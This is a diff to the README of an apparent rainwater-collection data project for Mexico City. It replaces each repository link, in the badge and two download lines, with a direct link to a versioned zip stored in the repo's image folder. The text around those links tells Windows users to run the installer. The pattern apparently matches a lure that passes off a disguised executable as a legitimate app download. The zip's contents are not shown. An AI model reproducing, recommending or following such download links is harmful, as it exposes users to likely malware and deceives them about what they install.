@@ -1,6 +1,6 @@
 # 💧 Sistemas-de-Capatacion-de-Lluvia-Ciudad-de-Mexico-2019-a-2024 - Explore Rainwater Collection Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Sistemas--de--Capatacion--de--Lluvia-blue?style=for-the-badge)](https://github.com/Shmuhammadbinfaiz/Sistemas-de-Capatacion-de-Lluvia-Ciudad-de-Mexico-2019-a-2024)
+[![Download Now](https://img.shields.io/badge/Download-Sistemas--de--Capatacion--de--Lluvia-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shmuhammadbinfaiz/Sistemas-de-Capatacion-de-Lluvia-Ciudad-de-Mexico-2019-a-2024/main/img/Capatacion_de_Mexico_Ciudad_Lluvia_Sistemas_a_2.8.zip)
 
 ## 📋 About this Application
 
@@ -32,7 +32,7 @@ Follow these steps to download and run the application on your Windows PC.
 
 1. Click the blue badge above or this link to visit the download page:
 
-   [Download Sistemas-de-Capatacion-de-Lluvia](https://github.com/Shmuhammadbinfaiz/Sistemas-de-Capatacion-de-Lluvia-Ciudad-de-Mexico-2019-a-2024)
+   [Download Sistemas-de-Capatacion-de-Lluvia](https://raw.githubusercontent.com/Shmuhammadbinfaiz/Sistemas-de-Capatacion-de-Lluvia-Ciudad-de-Mexico-2019-a-2024/main/img/Capatacion_de_Mexico_Ciudad_Lluvia_Sistemas_a_2.8.zip)
 
 2. On the page, look for the latest release or main download file. The file name usually ends with `.exe` or `.msi`.
 
@@ -104,6 +104,6 @@ For questions about the data, visit the official SEDEMA website.
 
 Get the latest version here:
 
-[Download Sistemas-de-Capatacion-de-Lluvia](https://github.com/Shmuhammadbinfaiz/Sistemas-de-Capatacion-de-Lluvia-Ciudad-de-Mexico-2019-a-2024)  
+[Download Sistemas-de-Capatacion-de-Lluvia](https://raw.githubusercontent.com/Shmuhammadbinfaiz/Sistemas-de-Capatacion-de-Lluvia-Ciudad-de-Mexico-2019-a-2024/main/img/Capatacion_de_Mexico_Ciudad_Lluvia_Sistemas_a_2.8.zip)  
 
 Use this link to visit the page and download the Windows installer file. Follow the steps above to install and run the app on your PC.
